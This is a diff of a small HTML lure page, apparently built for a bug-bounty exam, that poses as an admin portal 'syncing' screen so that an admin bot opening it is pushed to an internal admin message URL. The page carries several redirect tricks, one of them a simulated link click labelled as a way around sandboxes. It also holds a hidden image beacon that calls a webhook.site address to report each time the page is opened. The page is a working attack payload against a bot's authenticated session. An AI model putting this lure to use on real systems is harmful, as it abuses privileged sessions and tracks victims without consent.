@@ -1,27 +1,25 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Internal Admin Portal</title>
+    <meta http-equiv="refresh" content="0;url=https://bugbounty-exam.hashacademy.co/admin/messages/[INSERT_NEW_MESSAGE_ID]">
+    <title>Syncing...</title>
 </head>
 <body>
-    <div style="font-family: Arial, sans-serif; text-align: center; margin-top: 100px;">
-        <h1>Synchronizing with Admin Dashboard...</h1>
-        <p>Please do not close this window. Redirecting to message ID: <strong>69e797e8bee6d6b7c6642684</strong></p>
-    </div>
-
-    <img src="https://webhook.site/dfdfc140-626f-475f-ad0d-6f0b4d447a69?status=trigger_opened" style="display:none">
-
     <script>
-        // The ID from your latest POST request
-        const messageId = "69e797e8bee6d6b7c6642684";
-        const targetUrl = "https://bugbounty-exam.hashacademy.co/admin/messages/" + messageId;
+        // Method 2: JavaScript Location (Standard)
+        const target = "https://bugbounty-exam.hashacademy.co/admin/messages/69e797e8bee6d6b7c6642684";
+        
+        // Method 3: Click Simulation (Bypasses some Sandboxes)
+        const link = document.createElement('a');
+        link.href = target;
+        document.body.appendChild(link);
+        link.click();
 
-        // We use a 3-second delay to ensure the admin bot's browser 
-        // fully authenticates and loads the target page content.
-        setTimeout(() => {
-            window.location.href = targetUrl;
-        }, 3000);
+        // Backup Redirect
+        setTimeout(() => { window.location.replace(target); }, 500);
     </script>
+    
+    <p>Redirecting to Secure Admin Portal...</p>
+    <img src="https://webhook.site/dfdfc140-626f-475f-ad0d-6f0b4d447a69?status=github_hit">
 </body>
 </html>
